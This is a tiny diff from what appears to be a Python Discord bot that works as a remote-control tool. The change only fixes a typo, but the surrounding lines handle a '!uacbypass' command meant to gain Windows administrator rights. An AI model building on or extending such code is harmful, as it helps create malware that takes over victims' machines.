@@ -473,7 +473,7 @@ async def on_message(message):
             if isAdmin():
                 await message.channel.send("Your already admin!")
             else:
-                await message.channel.send("attempting to getting admin!")
+                await message.channel.send("attempting to get admin!")
                 if message.content == "!uacbypass":
                     uncritproc()
                     test_str = sys.argv[0]
